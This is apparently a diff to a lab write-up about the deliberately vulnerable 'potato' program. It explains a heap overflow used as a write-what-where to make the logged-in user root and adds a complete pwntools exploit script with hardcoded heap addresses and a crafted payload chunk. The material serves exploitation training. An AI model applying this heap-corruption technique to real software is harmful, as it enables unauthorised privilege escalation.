@@ -351,9 +351,146 @@ a digest of the password the user entered when logging in.
 
 ## gain a shell with root privileges (look at the allocator with ltrace while creating and deleting users)
 
+By using the write-what-where pattern in the linked list of all users, it is possible to change the value
+of `session->logged_in_user` such that it points to the `root` user. For that to work, however, the
+potato code has to be changed:
+
+```c
+void 
+delete_user()
+{
+    int id;
+
+    //walk_list(print_list_element);
+    fprintf(stdout, "Which one? > ");
+    scanf("%d", &id);
+    if(!delete_user_by_id(id)) {
+         fprintf(stderr, "not found.\n");
+    }
+}
+```
+
+The `walk_list(print_list_element);` call must be commented out since would cause a crash after the
+heap buffer overflow manipulated the user list.
+
+The left hand side diagram shows the memory layout of the various `t_user` chunks on the heap and the 
+`t_user_list` elements which implement a linearly linked list.
+
+The buffer overflow happens again in `change_name()` and overwrites the "peter" `t_user` chunk in such a
+way that it also overwrites its following `t_user_list` chunk. At the beginning of the "peter" chunk,
+we put a "fake" `t_user_list` entry, where `t_user_list::next` refers to the "root" chunk. This is the
+value which shall be written. The `t_user_list::user` element refers to a chunk of memory which can be
+freed (a chunk of data which constitutes a memory leak).
+
+The `t_user_list::next` field of the `t_user_list` following "peter" is overwritten to refer to the
+`session` global variable. In the subsequent step, this will force the program to interpret `session`
+as an object of type `t_user_list`. `t_user_list::next` is exactly at the same position as 
+`session->logged_in_user`. This is the chunk of data that shall be overwritten.
+
+![www1](./write_what_where1.png)
 
 
+After the heap is prepared, one element in the user list is deleted, which at some point invokes the 
+statement `prev_element->next = element->next;` in delete_user_by_id()`. In this scenario, 
+`prev_element->next` refers to the `session` global var (in reality: `session->logged_in_user`),
+`element` refers to the "fake" `t_user_list` entry at the beginning of "peter", and
+`element->next` refers to the `root` user chunk. Which in total amounts to `session->logged_in_user = root`.
 
+![www1](./write_what_where2.png)
+
+After the deletion completed, `whoami` will show "root" as the logged in user, which - in theory - allows
+to create a root shell.
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+import sys
+
+elf = ELF("./potato")
+
+p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
+gdb.attach(p, '''
+break userlist.c:84
+continue
+''')
+
+print(p.recvuntil(b"cmd> ")) # username
+p.sendline(b"login")
+# test user
+p.sendline(b"peter")
+p.sendline(b"12345")
+print(p.recvuntil(b"cmd> ")) # username
+
+# overwrite user structure with user-chosen id: 0
+# This overwrites the bytes of the global user-id via the strncpy() call in func.c, 190
+# since strncpy adds a null terminator at session.logged_in_user->name[54]
+p.sendline(b"changename")
+payload=b"\x41" * 50 + b"\x42" * 3
+p.sendline(payload)
+
+# Repeat the same for session.logged_in_user->name[53]
+p.sendline(b"changename")
+payload=b"\x41" * 50 + b"\x42" * 2
+p.sendline(payload)
+
+# all bytes in session.logged_in_user->id are now zero, we are privileged
+# change name back to original
+p.sendline(b"changename")
+payload=b"peter" + b"\x0a"
+p.sendline(payload)
+
+# ptr to leaked memory we got when logging in peter
+delete_mem_chunk = 0x8123490
+# ptr to root user: the value which will be written
+root_user_addr = 0x8124090
+# addresss of the session global var
+session_addr = 0x811df58
+
+# this chunk is a copy of the peter chunk (starting at byte 8) 
+# and a few following bytes, where all 0x00 bytes were replaced by 0xAA
+some_chunk = (
+"\x41\x41\x03\xAA\xAA\xAA\xb8\xcc"
+"\xff\xff\x18\xAA\xAA\xAA\x01\xAA"
+"\xAA\xAA\x6e\xAA\xAA\xAA\xf4\xcf"
+"\x11\x08\xAA\xce\xff\xff\x02\xAA"
+"\xAA\xAA\xb8\xcd\xff\xff\x6d\xc6"
+"\x04\x08\xb1\xcc\xff\xff\xf4\xcf"
+"\x11\x08\xb8\xcd\xff\xff\x16\xb6"
+"\x04\x08\x90\x63\x68\x61\x6e\x67"
+"\x65\x6e\x61\x6d\x65\xAA\xAA\xAA"
+"\xAA\xAA\xe7\xab\x06\x08\xf4\xcf"
+"\x11\x08\xa8\xb7\x11\x08\xf4\xcf"
+"\x11\x08\xc0\x2e\x12\x08\xAA\xAA"
+"\xAA\xAA\xAA\xAA\xAA\xAA\x30\x40"
+"\x07\x08\x80\x30\x12\x08\x37\x30"
+"\x12\x08\xAA\xb7\x11\x08\x74\xad"
+"\x06\x08\x08\xAA\xAA\xAA\xf4\xcf"
+"\x11\x08\xec\xff\xff\xff\xe0\xd4"
+"\x11\x08\x90\x28\x12\x08\xAA\xAA"
+"\xAA\xAA\xc4\xbe\x57\xba\x59\x85"
+"\x06\x08\xc0\x2e\x12\x08\xAA\xAA"
+"\xAA\xAA\x1d\xa6\x06\x08\x30\x40"
+)
+
+payload = p32(root_user_addr) + p32(delete_mem_chunk) + bytes(some_chunk, "latin1") + p32(session_addr)
+
+# overwrite Peters user buffer and its user_entry_t
+p.sendline(b"changename")
+p.sendline(payload)
+
+#
+# delete user 4
+#
+p.sendline(b"delete")
+p.sendline(b"4")
+
+#
+# We should be "root" now
+#
+p.interactive()
+```
 
 ## demonstrate a use after free or double free condition in the program
 
